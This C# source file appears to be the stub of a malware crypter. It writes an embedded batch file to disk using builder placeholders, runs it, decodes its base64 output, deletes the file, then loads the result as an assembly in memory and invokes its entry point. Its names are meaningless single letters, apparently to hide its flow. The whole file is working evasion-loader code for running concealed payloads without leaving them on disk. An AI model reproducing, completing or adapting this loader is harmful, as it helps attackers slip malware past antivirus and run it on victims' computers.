using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Stub
{
    internal class Program
    {
        static string AC; // bfpath
        static byte[] BC; // data

        static void Main(string[] args)
        {
            A();
            CB.A(BC, args);
        }

        static void A()
        {
            AC = "%BATCHNAME%";
            B();
        }

        static void B()
        {
            File.WriteAllBytes(AC, AB.A("%BATCHFILE%"));
            C();
        }

        static void C()
        {
            BC = Convert.FromBase64String(BB.A(AC));
            D();
        }

        static void D()
        {
            File.Delete(AC);
        }
    }

    class CB
    {
        static Assembly AC;
        static byte[] BC;
        static MethodInfo CC;
        static string[] DC;


        public static void A(byte[] data, string[] args)
        {
            BC = data;
            DC = args;
            B();
        }

        static void B()
        {
            AC = Assembly.Load(BC);
            C();
        }

        static void C()
        {
            CC = AC.EntryPoint;
            D();
        }

        static void D()
        {
            CC.Invoke(null, new object[] { DC });
        }
    }

    class AB
    {
        static Assembly AC;
        static MemoryStream BC;
        static Stream CC;
        static string DC;
        public static byte[] A(string name)
        {
            DC = name;
            AC = Assembly.GetExecutingAssembly();
            B();
            CC.Dispose();
            byte[] ret = BC.ToArray();
            BC.Dispose();
            return ret;
        }

        static void B()
        {
            BC = new MemoryStream();
            C();
        }

        static void C()
        {
            CC = AC.GetManifestResourceStream(DC);
            D();
        }

        static void D()
        {
            CC.CopyTo(BC);
        }
    }

    class BB
    {
        static string AC;
        static Process BC;

        public static string A(string name)
        {
            BC = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = name,
                    UseShellExecute = false,
                    RedirectStandardOutput = true
                }
            };
            B();
            return AC;
        }

        static void B()
        {
            BC.Start();
            C();
        }

        static void C()
        {
            AC = BC.StandardOutput.ReadToEnd();
            D();
        }

        static void D()
        {
            BC.WaitForExit();
        }
    }
}